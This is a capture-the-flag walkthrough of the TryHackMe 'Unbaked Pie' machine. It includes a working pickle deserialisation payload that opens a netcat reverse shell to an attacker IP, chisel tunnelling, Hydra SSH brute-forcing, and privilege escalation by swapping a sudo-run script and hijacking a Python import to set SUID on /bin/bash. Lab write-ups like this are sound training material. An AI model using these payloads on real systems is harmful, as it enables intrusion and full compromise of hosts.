# Unbaked Pie

***

Platform: [Tryhackme](https://tryhackme.com/room/unbakedpie)

Difficulty: Medium

Initial Access: Python Pickle Deserialisation Vulnerability

Privilege Escalation: Misconfigured sudo privileges + vulnerable python codes.

***

Nmap Scan:

```bash
┌──(ghost㉿kali)-[~/tryhackme/unbaked-pie]
└─$ cat nmap.full
# Nmap 7.95 scan initiated Wed Aug 13 23:29:53 2025 as: /usr/lib/nmap/nmap -Pn -A -p- --min-rate 4000 -oN nmap.full 10.201.34.121
Nmap scan report for 10.201.34.121
Host is up (0.24s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
5003/tcp open  http    WSGIServer 0.2 (Python 3.8.6)
|_http-server-header: WSGIServer/0.2 CPython/3.8.6
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|storage-misc
Running (JUST GUESSING): Linux 3.X|4.X|2.6.X (97%), Synology DiskStation Manager 7.X (87%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:2.6 cpe:/a:synology:diskstation_manager:7.1 cpe:/o:linux:linux_kernel:4.4
Aggressive OS guesses: Linux 3.10 - 4.11 (97%), Linux 3.13 - 4.4 (97%), Linux 3.2 - 4.14 (97%), Linux 3.8 - 3.16 (97%), Linux 2.6.32 - 3.13 (91%), Linux 4.4 (91%), Linux 2.6.32 - 3.10 (91%), Linux 3.13 or 4.2 (90%), Linux 3.16 - 4.6 (90%), Linux 3.16 (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 5 hops
```

| Ports       | Methodology                                                                      |
| ----------- | -------------------------------------------------------------------------------- |
| 5003 (HTTP) | WSFIServer 0.2 (Python 3.8.6) , maybe some python script running on this server. |

***

### Initial Enumeration

Visiting server shows a website was hosted on that server named “Unbaked” .

<figure><img src="https://github.com/user-attachments/assets/0db1a380-df23-4205-ab35-27f08e40f1a0" alt=""><figcaption></figcaption></figure>

Randomly visting `/robots.txt` shows page not found error, but it also disclose some backend information, that website was coded with django web framework of python.

<figure><img src="https://github.com/user-attachments/assets/1c50dc53-ac42-4c53-adbf-fc05b266a229" alt=""><figcaption></figcaption></figure>

Further enumeration of website revealed a potential vulnerability in it’s search feature request. When I tried to search some random words in that search box and intercepting that search query request via burp suite revealed that it’s sending some type of `search_cookie` also with the HTTP POST request.

<figure><img src="https://github.com/user-attachments/assets/482d350b-599c-4bea-aeba-91f57142a2ca" alt=""><figcaption></figcaption></figure>

That value looks like encoded in base64, decoded that value and found that it’s the same command which I entered in that search box, but it also contains some unknown patterns or let’s say junk with it, what’s that?

<figure><img src="https://github.com/user-attachments/assets/44f719dc-1719-43c4-b70c-0db44f63c423" alt=""><figcaption></figcaption></figure>

Searching about this on google, found an interesting [article by david hamann](https://davidhamann.de/2020/04/05/exploiting-python-pickle/) on python pickle deserialisation vulnerability, where he explained this whole process and why its’ a potential vulnerability. I strongly suggest you to check that out first.

why this is dangerous?

So, basically `pickle.loads()` in Python will execute arbitrary code during deserialization if the payload contains a specially crafted object. If the server takes your Base64-encoded data and calls `pickle.loads()` directly then it’s **game over**. Like these:

```bash
data = base64.urlsafe_b64decode(request.form['search_cookie'])
deserialized = pickle.loads(data)
```

For confirmation, we can also check it with python on our machine like these:

<figure><img src="https://github.com/user-attachments/assets/f479c443-3c52-4be6-b1a8-b529ceb3df6e" alt=""><figcaption></figcaption></figure>

Confirmed.

***

### Initial Access

Prepared a python script to generate our payload:

```bash
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        cmd = ('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.17.87.131 4445 >/tmp/f')
        return os.system, (cmd,)

if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    print(base64.urlsafe_b64encode(pickled))
```

This script will generate that same type of base64 encoded string which when loads by server, provide us reverse shell back to our machine.

Generated payload

<figure><img src="https://github.com/user-attachments/assets/c224806e-606d-4cfd-bbcf-c41ea22cd7be" alt=""><figcaption></figcaption></figure>

Copied this b64 encoded string and replaced `search_cookie` header's value in that HTTP POST request via burp suite repeater.

<figure><img src="https://github.com/user-attachments/assets/a1120377-de59-4212-aa39-99914353b096" alt=""><figcaption></figcaption></figure>

As we send that request, we got reverse shell back to our listening netcat server.

<figure><img src="https://github.com/user-attachments/assets/2c79635d-d15e-4cca-aebf-bec9f9e33b5b" alt=""><figcaption></figcaption></figure>

Got root shell on container, not on host machine.

***

### Shell As Ramsey

While enumerating the directories and files in that container, found something interesting in `.bash_history` file.

<figure><img src="https://github.com/user-attachments/assets/3465ee06-3a6a-483d-8a8d-fd325df6f7e8" alt=""><figcaption></figcaption></figure>

```bash
root@8b39a559b296:~# cat .bash_history
cat .bash_history
nc
exit
ifconfig
ip addr
ssh 172.17.0.1
ssh 172.17.0.2
exit
ssh ramsey@172.17.0.1
exit
..........
```

User was trying to ssh to user `ramsey` on IP address `172.17.0.1` (potentially hostmachine’s IP). Checked open ports on that IP address with the help of nc binary present on that container and found ssh open.

<figure><img src="https://github.com/user-attachments/assets/32aa2426-e40e-4653-83aa-039d227b6a73" alt=""><figcaption></figcaption></figure>

As we can’t directly access that host machine’s port we can simply use port forwarding with chisel.

First of all transfer chisel binary with python http server to that container. Use can download chisel from [here](https://github.com/jpillora/chisel/releases).

Then, simply forwarded that port with following commands:

```bash
# Our Own Attacker machine
┌──(ghost㉿kali)-[~/tryhackme/unbaked-pie]
└─$ sudo ./chisel server -p 9001 --reverse
2025/08/14 00:55:49 server: Reverse tunnelling enabled
2025/08/14 00:55:49 server: Fingerprint Ai3KlsLPgRQKofm7zT3Wtvhs25IBE2PC0eEyJmM/3gY=
2025/08/14 00:55:49 server: Listening on http://0.0.0.0:9001
2025/08/14 00:56:32 server: session#1: tun: proxy#R:22=>172.17.0.1:22: Listening

# On container
root@8b39a559b296:~# ls
ls
chisel
root@8b39a559b296:~# chmod +x chisel
chmod +x chisel
root@8b39a559b296:~# ./chisel client 10.17.87.131:9001 R:22:172.17.0.1:22
./chisel client 10.17.87.131:9001 R:22:172.17.0.1:22
2025/08/14 04:56:29 client: Connecting to ws://10.17.87.131:9001
2025/08/14 04:56:32 client: Connected (Latency 244.000475ms)
```

For confirmation :

<figure><img src="https://github.com/user-attachments/assets/3ae0143b-fc85-43ad-b707-583c0ce2f4a6" alt=""><figcaption></figcaption></figure>

Now, as we have valid username `ramsey`, we can brute force that user’s password with hydra.

<figure><img src="https://github.com/user-attachments/assets/47159fe8-5e24-4a31-addb-e8e9f94c1986" alt=""><figcaption></figcaption></figure>

Found user ramsey’s password.

Logged in to ramsey’s account via ssh

<figure><img src="https://github.com/user-attachments/assets/9ae86f43-5d15-4058-aa40-7cdfed33cf6c" alt=""><figcaption></figcaption></figure>

Grabbed user flag

<figure><img src="https://github.com/user-attachments/assets/e8224acb-5ebb-42f2-95e5-45590a666e3b" alt=""><figcaption></figcaption></figure>

***

### Shell As Oliver

Checking sudo privileges of user ramsey, shows ramsey can run a python script named `vuln.py` (which is in his own directory `/home/ramsey` )as user oliver.

<figure><img src="https://github.com/user-attachments/assets/0887ee46-0a6d-48e5-9203-5284b7bbe6a2" alt=""><figcaption></figcaption></figure>

As we don’t have direct write access to that `vuln.py` file, but we have full permission on the directory where it is stored. So I changed that file name to `vuln-bak.py` and created another file with the same name `vuln.py` and put following code in that file via nano editor.

<figure><img src="https://github.com/user-attachments/assets/285d67c0-8e0c-4788-bca3-e9bffebac6b9" alt=""><figcaption></figcaption></figure>

```bash
import os
os.system('mkdir /home/oliver/.ssh')
os.system('cp /home/ramsey/oliver.pub /home/oliver/.ssh/authorized_keys')
```

This code will create a directory `.ssh` on oliver’s home directory, then it will copy oliver.pub(Which we will generate just after this) file contents to `authorized_keys` file of that `.ssh` directory inside `/home/oliver` . Which will give us access to log into oliver’s account via ssh.

Generated ssh-keys

<figure><img src="https://github.com/user-attachments/assets/7b4f56d4-0778-428c-ba80-6ea4bf5fb4b7" alt=""><figcaption></figcaption></figure>

<figure><img src="https://github.com/user-attachments/assets/3718ee5c-4f68-4cf7-8b3e-74df22cb277d" alt=""><figcaption></figcaption></figure>

Run `vuln.py` with sudo privileges

```bash
ramsey@unbaked:~$ sudo -u oliver /usr/bin/python /home/ramsey/vuln.py
```

Changed that `oliver` file’s permission and then logged into oliver’s account using his private key `oliver` via ssh.

<figure><img src="https://github.com/user-attachments/assets/09a5692d-c502-4511-b28b-16b3ca8a4f9d" alt=""><figcaption></figcaption></figure>

***

### Shell As Root

Checking sudo privileges of user oliver, shows that user oliver can run `/opt/dockerScript.py` as root.

User oliver doesn’t have write privilege to that script, so no script editing this time.

But as we can see that script is importing docker(no fixed path), we can abuse that.

<figure><img src="https://github.com/user-attachments/assets/76ffe148-306e-4ffe-80af-0edb33491599" alt=""><figcaption></figcaption></figure>

Since Python resolves imports based on `PYTHONPATH`, we can place a malicious [`docker.py`](http://docker.py) in a controlled directory(`/home/oliver`), set that directory in `PYTHONPATH` during execution, and our code will be loaded instead of the legitimate `docker` module.

Created `docker.py` file in`/home/oliver` directory.

<figure><img src="https://github.com/user-attachments/assets/dee73e94-8376-4f7d-9d17-2d13711ca8b3" alt=""><figcaption></figcaption></figure>

```bash
import os
os.system('chmod 4777 /bin/bash')
```

This code will set SUID bit to `/bin/bash` binary.

Execute that script with sudo privileges.

```bash
oliver@unbaked:~$ sudo PYTHONPATH=`pwd` /usr/bin/python /opt/dockerScript.py
```

Ok, all set , now just have to execute that `/bin/bash` binary to get root level access.

<figure><img src="https://github.com/user-attachments/assets/dcbeeeba-bb2d-4336-b4ad-cb8c16f46890" alt=""><figcaption></figcaption></figure>

Grabbed root flag

<figure><img src="https://github.com/user-attachments/assets/d204c9fd-8018-40ce-97fd-a50f6c6d572e" alt=""><figcaption></figcaption></figure>

***

That’s it for this machine.✅
